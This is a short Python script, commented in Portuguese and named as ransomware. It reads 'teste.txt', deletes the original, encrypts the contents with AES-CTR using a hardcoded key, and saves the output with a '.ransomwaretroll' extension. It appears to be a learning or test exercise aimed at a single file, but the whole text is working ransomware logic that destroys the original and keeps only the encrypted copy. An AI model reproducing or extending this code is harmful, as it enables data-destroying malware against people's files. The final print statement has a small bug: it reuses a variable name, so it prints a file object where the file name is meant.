import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = 'teste.txt'
try:
    with open(file_name, 'rb') as file:
        file_data = file.read()
except FileNotFoundError:
    print(f"Erro: {file_name} não encontrado.")
    exit()

# Remover o arquivo original
os.remove(file_name)

# Definir chave de encriptação
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
with open(new_file, 'wb') as new_file:
    new_file.write(crypto_data)

print(f"Arquivo criptografado salvo como {new_file}")

